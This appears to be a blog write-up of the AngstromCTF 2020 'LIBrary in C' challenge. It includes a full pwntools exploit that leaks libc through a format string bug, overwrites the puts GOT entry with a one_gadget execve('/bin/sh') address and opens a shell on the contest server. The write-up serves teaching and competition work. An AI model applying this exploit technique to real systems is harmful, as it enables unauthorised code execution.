---
layout: post
title: AngstromCTF 2020 - LIBrary in C
excerpt: "Writeup for format string ret2libc gadget challenge from AngstromCTF 2020"
categories: [pwn]
---

LIBrary in C was the fifth challenge in the binary exploitation category of AngstromCTF 2020. The challenge supplies us with an executable, some source code (below), and a libc file. Usually whenever a pwnable challenge gives a libc file, some sort of ret2libc is involved. 

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);

	gid_t gid = getegid();
	setresgid(gid, gid, gid);

	char name[64];
	char book[64];

	puts("Welcome to the LIBrary in C!");
	puts("What is your name?");
	fgets(name, 64, stdin);
	// printf works just like System.out.print in Java right?
	printf("Why hello there ");
	printf(name);
	puts("And what book would you like to check out?");
	fgets(book, 64, stdin);
	printf("Your cart:\n - ");
	printf(book);
	puts("\nThat's great and all but uh...");
	puts("It turns out this library doesn't actually exist so you'll never get your book.");
	puts("Have a nice day!");
}
{% endhighlight %}

The source is actually pretty simple, and we can see that there are two calls to printf where we control the first argument. In other words - [format string vulnerability](https://en.wikipedia.org/wiki/Uncontrolled_format_string)! Let's start by doing some checks on the binary and on the libc version.

```
root@b1a0c5b0df97 /pwn# checksec ./library_in_c
[*] '/pwn/library_in_c'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
root@b1a0c5b0df97 /pwn# checksec ./libc.so.6 
[*] '/pwn/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Looks like the libc has [PIE](https://en.wikipedia.org/wiki/Position-independent_code) enabled so leaking the libc base address will be a necessary step if we wish to return to somewhere in libc. Since there are two calls to printf, one call could be used to leak the libc base address and the other could be used to overwrite something on the [GOT](https://en.wikipedia.org/wiki/Global_Offset_Table) to point to something in libc. My guess is overwriting the puts function to point to libc system or a useful gadget (more on that later). Running the binary confirms the format string vulnerability (seen below).

```
root@b1a0c5b0df97 /pwn# ./library_in_c 
Welcome to the LIBrary in C!
What is your name?
%x %x %x %x
Why hello there f7c34c00 ca921780 ca6522c0 cab3f700
And what book would you like to check out?
%x %x %x %x
Your cart:
 - f7c34c00 ca921780 ca6522c0 cab3f700

That's great and all but uh...
It turns out this library doesn't actually exist so you'll never get your book.
Have a nice day!
```

Now that we have an idea of what we need to do we can launch the binary in GDB. In order to leak the base of libc we need to understand a little bit of how function calls work in compiled binaries. Whenever something is called, the next address is pushed to the stack, and the instruction pointer is set to the address of whatever is being called. `__libc_start_main` is the setup function which (more or less) calls the main function. After the main function, the instruction pointer returns to the address that was pushed onto the stack in `__libc_start_main`. This means that we can find an offset of `__libc_start_main` somewhere on the stack.

```
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400747 <+0>:	push   rbp
   0x0000000000400748 <+1>:	mov    rbp,rsp
   0x000000000040074b <+4>:	sub    rsp,0xa0
   0x0000000000400752 <+11>:	mov    rax,QWORD PTR fs:0x28
   0x000000000040075b <+20>:	mov    QWORD PTR [rbp-0x8],rax
   0x000000000040075f <+24>:	xor    eax,eax
   0x0000000000400761 <+26>:	mov    rax,QWORD PTR [rip+0x2008f8]        # 0x601060 <stdout@@GLIBC_2.2.5>
   0x0000000000400768 <+33>:	mov    ecx,0x0
   0x000000000040076d <+38>:	mov    edx,0x2
   0x0000000000400772 <+43>:	mov    esi,0x0
   0x0000000000400777 <+48>:	mov    rdi,rax
   0x000000000040077a <+51>:	call   0x400650 <setvbuf@plt>
   0x000000000040077f <+56>:	call   0x400640 <getegid@plt>
   0x0000000000400784 <+61>:	mov    DWORD PTR [rbp-0x94],eax
   0x000000000040078a <+67>:	mov    edx,DWORD PTR [rbp-0x94]
   0x0000000000400790 <+73>:	mov    ecx,DWORD PTR [rbp-0x94]
   0x0000000000400796 <+79>:	mov    eax,DWORD PTR [rbp-0x94]
   0x000000000040079c <+85>:	mov    esi,ecx
   0x000000000040079e <+87>:	mov    edi,eax
   0x00000000004007a0 <+89>:	call   0x400610 <setresgid@plt>
   0x00000000004007a5 <+94>:	lea    rdi,[rip+0x16c]        # 0x400918
   0x00000000004007ac <+101>:	call   0x4005f0 <puts@plt>
   0x00000000004007b1 <+106>:	lea    rdi,[rip+0x17d]        # 0x400935
   0x00000000004007b8 <+113>:	call   0x4005f0 <puts@plt>
   0x00000000004007bd <+118>:	mov    rdx,QWORD PTR [rip+0x2008ac]        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x00000000004007c4 <+125>:	lea    rax,[rbp-0x90]
   0x00000000004007cb <+132>:	mov    esi,0x40
   0x00000000004007d0 <+137>:	mov    rdi,rax
   0x00000000004007d3 <+140>:	call   0x400630 <fgets@plt>
   0x00000000004007d8 <+145>:	lea    rdi,[rip+0x169]        # 0x400948
   0x00000000004007df <+152>:	mov    eax,0x0
   0x00000000004007e4 <+157>:	call   0x400620 <printf@plt>
   0x00000000004007e9 <+162>:	lea    rax,[rbp-0x90]
   0x00000000004007f0 <+169>:	mov    rdi,rax
   0x00000000004007f3 <+172>:	mov    eax,0x0
   0x00000000004007f8 <+177>:	call   0x400620 <printf@plt>
   0x00000000004007fd <+182>:	lea    rdi,[rip+0x15c]        # 0x400960
   0x0000000000400804 <+189>:	call   0x4005f0 <puts@plt>
   0x0000000000400809 <+194>:	mov    rdx,QWORD PTR [rip+0x200860]        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x0000000000400810 <+201>:	lea    rax,[rbp-0x50]
   0x0000000000400814 <+205>:	mov    esi,0x40
   0x0000000000400819 <+210>:	mov    rdi,rax
   0x000000000040081c <+213>:	call   0x400630 <fgets@plt>
   0x0000000000400821 <+218>:	lea    rdi,[rip+0x163]        # 0x40098b
   0x0000000000400828 <+225>:	mov    eax,0x0
   0x000000000040082d <+230>:	call   0x400620 <printf@plt>
   0x0000000000400832 <+235>:	lea    rax,[rbp-0x50]
   0x0000000000400836 <+239>:	mov    rdi,rax
   0x0000000000400839 <+242>:	mov    eax,0x0
   0x000000000040083e <+247>:	call   0x400620 <printf@plt>
   0x0000000000400843 <+252>:	lea    rdi,[rip+0x156]        # 0x4009a0
   0x000000000040084a <+259>:	call   0x4005f0 <puts@plt>
   0x000000000040084f <+264>:	lea    rdi,[rip+0x16a]        # 0x4009c0
   0x0000000000400856 <+271>:	call   0x4005f0 <puts@plt>
   0x000000000040085b <+276>:	lea    rdi,[rip+0x1ae]        # 0x400a10
   0x0000000000400862 <+283>:	call   0x4005f0 <puts@plt>
   0x0000000000400867 <+288>:	mov    eax,0x0
   0x000000000040086c <+293>:	mov    rcx,QWORD PTR [rbp-0x8]
   0x0000000000400870 <+297>:	xor    rcx,QWORD PTR fs:0x28
   0x0000000000400879 <+306>:	je     0x400880 <main+313>
   0x000000000040087b <+308>:	call   0x400600 <__stack_chk_fail@plt>
   0x0000000000400880 <+313>:	leave  
   0x0000000000400881 <+314>:	ret    
End of assembler dump.

(gdb) b *0x00000000004007fd
Breakpoint 1 at 0x4007fd
(gdb) r
Starting program: /pwn/library_in_c 

Welcome to the LIBrary in C!
What is your name?
michael
Why hello there michael

Breakpoint 1, 0x00000000004007fd in main ()

(gdb) x __libc_start_main
0x7ffff7a2d740 <__libc_start_main>:	0x55415641

(gdb) x/30xg $rsp
0x7fffffffe5c0:	0x0000000000000000	0x0000000000000000
0x7fffffffe5d0:	0x7025207025207025	0x2520702520702520
0x7fffffffe5e0:	0x2070252070252070	0x7025207025207025
0x7fffffffe5f0:	0x2520702520702520	0x2070252070252070
0x7fffffffe600:	0x7025207025207025	0x0020702520702520
0x7fffffffe610:	0x00007ffff7ffe168	0x0000000000f0b5ff
0x7fffffffe620:	0x0000000000000001	0x00000000004008dd
0x7fffffffe630:	0x00007fffffffe65e	0x0000000000000000
0x7fffffffe640:	0x0000000000400890	0x0000000000400660
0x7fffffffe650:	0x00007fffffffe740	0xb87f2a8ed601f300
0x7fffffffe660:	0x0000000000400890	0x00007ffff7a2d830
0x7fffffffe670:	0x0000000000000001	0x00007fffffffe748
0x7fffffffe680:	0x00000001f7ffcca0	0x0000000000400747
0x7fffffffe690:	0x0000000000000000	0xecf9cfed110ca862
0x7fffffffe6a0:	0x0000000000400660	0x00007fffffffe740
```

Great! The pointer at `0x7fffffffe668` looks close to that of `__libc_start_main`. Doing the subtraction in python confirms our suspicions. The address is that of `<__libc_start_main+240>`. 

```
root@b1a0c5b0df97 /pwn# python
Python 2.7.12 (default, Oct  8 2019, 14:14:10) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x00007ffff7a2d830 - 0x7ffff7a2d740
240
```

Keep in mind that even though the libc base address is randomized because of the PIE, all of the offsets are still the same. Since `__libc_start_main` is in libc, knowing its address can effectively give us the address to anything else in libc. Now we can find the offset from `<__libc_start_main+240>` to libc base. 

```
(gdb) set environment LD_PRELOAD ./libc.so.6
(gdb) b *0x00000000004007fd
Breakpoint 1 at 0x4007fd
(gdb) r
Starting program: /pwn/library_in_c 
Welcome to the LIBrary in C!
What is your name?
%p                    
Why hello there 0x7fffffffbf20

Breakpoint 1, 0x00000000004007fd in main ()
(gdb) info proc mappings
process 473
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x401000     0x1000        0x0 /pwn/library_in_c
            0x600000           0x601000     0x1000        0x0 /pwn/library_in_c
            0x601000           0x602000     0x1000     0x1000 /pwn/library_in_c
            0x602000           0x623000    0x21000        0x0 [heap]
      0x7ffff7a0d000     0x7ffff7bcd000   0x1c0000        0x0 /pwn/libc.so.6
      0x7ffff7bcd000     0x7ffff7dcd000   0x200000   0x1c0000 /pwn/libc.so.6
      0x7ffff7dcd000     0x7ffff7dd1000     0x4000   0x1c0000 /pwn/libc.so.6
      0x7ffff7dd1000     0x7ffff7dd3000     0x2000   0x1c4000 /pwn/libc.so.6
      0x7ffff7dd3000     0x7ffff7dd7000     0x4000        0x0 
      0x7ffff7dd7000     0x7ffff7dfd000    0x26000        0x0 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7ff4000     0x7ffff7ff7000     0x3000        0x0 
      0x7ffff7ff7000     0x7ffff7ffa000     0x3000        0x0 [vvar]
      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x25000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
(gdb) x __libc_start_main
0x7ffff7a2d740 <__libc_start_main>:	0x55415641
(gdb) x/i puts
0x4005f0 <puts@plt>:	jmp    QWORD PTR [rip+0x200a22]        # 0x601018
```

Let's use python to calculate the offset.

```
root@b1a0c5b0df97 /pwn# python
Python 2.7.16 (default, Dec 13 2019, 18:00:32) 
[GCC 4.2.1 Compatible Apple LLVM 11.0.0 (clang-1100.0.32.4) (-macos10.15-objc-s on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> libc_start_main = 0x7ffff7a2d740
>>> libc_base = 0x7ffff7a0d000
>>> libc_start_main - libc_base
132928
```

Great! The offset seems to be `132928`. Through some trial and error, we can find that `%27$p` will give us the `<__libc_start_main+240>` address.

```
(gdb) r
Starting program: /pwn/library_in_c 
Welcome to the LIBrary in C!
What is your name?
%25$p %26$p %27$p %28$p %29$p %30$p
Why hello there 0xabb2f3a2c9026f00 0x400890 0x7ffff7a2d830 0x1 0x7fffffffe748 0x1f7ffcca0
```

Now we have all necessary information to write a python script that leaks the base address of libc. I will use [pwntools](https://github.com/Gallopsled/pwntools) since it is easy to use and works very well.

{% highlight python %}
from pwn import *

r = remote('shell.actf.co', 20201)

# format string to leak <__libc_start_main+240>
r.sendline(';%27$p;')

# __libc_start_main address
libc_start_main = int(r.recvuntil('check out?').split(';')[1], 16) - 240

# libc base address
libc_base = libc_start_main - 133168

print(hex(libc_base))
{% endhighlight %}

All that is left to do now is to overwrite the address of puts, which we found above to be stored at `0x601018`. To do this, we can use the format string modifier `%n` which will write the total number of bytes printed to the argument. It works well to use this along with `%Nx`, because this modifier will print a hex word padded to size N. In order to do this more effieiently, I split up the address into three two-byte sections, so it wouldn't be necassary to print millions of bytes for the format string. This is achieved through [bit masking](https://en.wikipedia.org/wiki/Mask_(computing)). The "h" before the "n" in `%hn` will operate on halfwords (two bytes) instead of full words (four bytes). Through trial and error you will find that the three addresses after byte 40 in the payload can be accessed with `%21$p`, `%22$p`, and `%23$p`. Changing the "p"s to "n"s will allow us to write to these addresses. 

```
root@b1a0c5b0df97 /pwn# one_gadget libc.so.6 
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

Whenever I was writing this script during the CTF I got stuck for a long time trying to write the address of libc system into the puts pointer. This would be a fine idea, but system expects a command string to be pushed onto the stack before execution (preferably "/bin/sh"). With the payload below, I could not figure out how to make this happen, until I tried the [one gadget](https://github.com/david942j/one_gadget) gem which helps to find one gadget RCE. Running the gem on the libc.so.6 file gives the output seen above, and the second gadget is found to work in this case (through some trial and error). The [objdump](https://linux.die.net/man/1/objdump) tool would have also worked for this, but one_gadget makes the job much easier.

{% highlight python %}
from pwn import *

r = remote('shell.actf.co', 20201)

# format string to leak <__libc_start_main+240>
r.sendline(';%27$p;')

# __libc_start_main address
libc_start_main = int(r.recvuntil('check out?').split(';')[1], 16) - 240

# libc base address
libc_base = libc_start_main - 132928

# location of pointer to <puts@plt>
puts = 0x601018

# system("/bin/sh") gadget location
system = libc_base + 0x4526a

# split into three halfword sections of system gadget address
# only three necessary because address usually starts with 0x0000...
p1 = (system & 0xffff)
p2 = (system & 0xffff0000) >> 16
p3 = (system & 0xffff00000000) >> 32

ps = {p1: '21', p2: '22', p3: '23'}

# write the halfword sections to the sections of the puts pointer

sm = sorted(ps)[0]
pl = "%{}x".format(sm)
pl += "%{}$hn".format(ps[sm])

md = sorted(ps)[1]
pl += "%{}x".format(md - sm)
pl += "%{}$hn".format(ps[md])

lg = sorted(ps)[2]
pl += "%{}x".format(lg - md)
pl += "%{}$hn".format(ps[lg])

# keep stack aligned 
pl += "A" * (40 - len(pl))

pl += p64(puts + 0) # 21$
pl += p64(puts + 2) # 22$
pl += p64(puts + 4) # 23$

# send the payload
r.sendline(pl)

r.interactive()
{% endhighlight %}

Running this script gives us an interactive prompt. 

```
root@b1a0c5b0df97 /pwn# python exploit.py 
[+] Opening connection to shell.actf.co on port 20201: Done
[*] Switching to interactive mode
$ id
uid=11969(problem2020_library_in_c) gid=11969(problem2020_library_in_c) groups=11969(problem2020_library_in_c)
$ cat flag.txt
actf{us1ng_c_15_n3v3r_4_g00d_1d34}
```

Using `cat` on the flag file gives us `actf{us1ng_c_15_n3v3r_4_g00d_1d34}`, which can be submitted on the site for 120 points!